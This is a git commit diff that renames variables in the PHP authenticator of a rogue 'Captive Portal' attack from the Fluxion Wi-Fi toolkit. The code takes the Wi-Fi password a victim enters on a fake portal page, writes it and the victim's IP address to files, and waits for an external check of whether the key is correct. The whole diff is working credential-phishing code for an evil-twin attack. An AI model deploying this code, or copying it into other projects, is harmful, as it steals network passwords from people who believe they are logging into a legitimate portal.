681c4414e88feaa43a687bc5c279f4e89e799338
chinarulezzz <alexandr.savca89@gmail.com>
2019-05-27 22:56:26 +0300

    Improved identifiers & sequencing

--- attacks/Captive Portal/lib/authenticator.php
+++ attacks/Captive Portal/lib/authenticator.php
@@ -1,67 +1,70 @@
 <?php
 	error_reporting(0);
 
-	/*
-		The following represents the authenticator result.
-		By default, we assume the password is incorrect.
-
-		Notice: This variable is used by files including
-		this script, and by the authenticator itself below.
-	 */
-	$candidate_code = 0;
-
-	// Receive get & post data and store to variables
-	$candidateKeyFields = array("password", "password1", "passphrase", "key", "key1", "wpa", "wpa_psw");
-	$matches = array_intersect_key($_POST, array_flip($candidateKeyFields));
+	// Store get & post data to variables
+	$candidate_key_fields         = array("password", "password1", "passphrase", "key", "key1", "wpa", "wpa_psw");
+	$candidate_key_fields_matches = array_intersect_key($_POST, array_flip($candidate_key_fields));
 
 	// Retrieve just the first matched value
-	$key = reset($matches);
+	$candidate_key = reset($candidate_key_fields_matches);
 
-	// No password was given
-	if(empty($key)) return;
+	// The following variable represents the authenticator result.
+	// Be default, we assume the password is incorrect (value 0).
+	// WARNING: The variable below is used by external scripts.
+	//          That means it MUST be defined before exiting returning.
+	$candidate_key_result = 0;
 
-	// Update hit attempts
-	$page_hits_log_path = ("$FLUXIONWorkspacePath/hit.txt");
-	$page_hits = file($page_hits_log_path)[0] + 1;
-	$page_hits_log = fopen($page_hits_log_path, "w");
-	fputs($page_hits_log, $page_hits);
-	fclose($page_hits_log);
+	// Attempt verification only if a key exists
+	if(!empty($candidate_key))
+	{
+		// Increment hit attempts
+		$page_hits_log_path  = ("$FLUXIONWorkspacePath/hit.txt");
+		$page_hits           = file($page_hits_log_path)[0] + 1;
+		$page_hits_log       = fopen($page_hits_log_path, "w");
 
-	// Prepare candidate and attempt passwords files' locations.
-	$attempt_log_path = "$FLUXIONWorkspacePath/pwdattempt.txt";
-	$candidate_path = "$FLUXIONWorkspacePath/candidate.txt";
+		fputs($page_hits_log, $page_hits);
+		fclose($page_hits_log);
 
-	$attempt_log = fopen($attempt_log_path, "w");
-	fwrite($attempt_log, $key);
-	fwrite($attempt_log, "\n");
-	fclose($attempt_log);
+		// Prepare candidate, and attempt, password files' locations
+		// Notice: The values in the strings below will be substituted
+		//         by the script once the authenticator script is deployed.
+		$attempt_log_path    = "$FLUXIONWorkspacePath/pwdattempt.txt";
+		$candidate_key_path  = "$FLUXIONWorkspacePath/candidate.txt";
+		$attempt_log_file    = fopen($attempt_log_path, "w");
 
-	// Write candidate key to file to prep for checking.
-	$candidate = fopen($candidate_path, "w");
-	fwrite($candidate, $key);
-	fwrite($candidate, "\n");
-	fclose($candidate);
+		fwrite($attempt_log_file, $candidate_key);
+		fwrite($attempt_log_file, "\n");
+		fclose($attempt_log_file);
 
-	$candidate_result_path = "$FLUXIONWorkspacePath/candidate_result.txt";
+		// Write candidate key to file to prep for checking
+		$candidate_key_file  = fopen($candidate_key_path, "w");
 
-	// Define variables
-	$client_ip_path = "/tmp/fluxspace/ip_hits";
-	$client_ip = $_SERVER['REMOTE_ADDR'];
-	
-	// Write ip to file
-	$c = fopen($client_ip_path, "w");
-	fwrite($c,$client_ip);
-	fclose($c);
+		fwrite($candidate_key_file, $candidate_key);
+		fwrite($candidate_key_file, "\n");
+		fclose($candidate_key_file);
 
-	// Create candidate result file to trigger checking.
-	$candidate_result = fopen($candidate_result_path, "w");
-	fwrite($candidate_result,"\n");
-	fclose($candidate_result);
+		// Prepare clients IP log path, and client IP
+		$clients_IP_log_path = "$FLUXIONWorkspacePath/ip_hits";
+		$client_IP           = $_SERVER["REMOTE_ADDR"];
 
-	do {
-		sleep(1);
-		$candidate_code = trim(file_get_contents($candidate_result_path));
-	} while (!ctype_digit($candidate_code));
+		// Write client IP to log file
+		$clients_IP_file     = fopen($clients_IP_log_path, "w");
 
-	// Reset file by deleting it.
-	unlink($candidate_result_path);
+		fputs($clients_IP_file, $client_IP);
+		fclose($clients_IP_file);
+
+		// Create candidate result file to trigger checking
+		$candidate_key_result_path = "$FLUXIONWorkspacePath/candidate_result.txt";
+		$candidate_key_result_file = fopen($candidate_key_result_path, "w");
+
+		fwrite($candidate_key_result_file, "\n");
+		fclose($candidate_key_result_file);
+
+		do {
+			sleep(1);
+			$candidate_key_result = trim(file_get_contents($candidate_key_result_path));
+		} while (!ctype_digit($candidate_key_result));
+
+		// Reset file by deleting it
+		unlink($candidate_key_result_path);
+	}
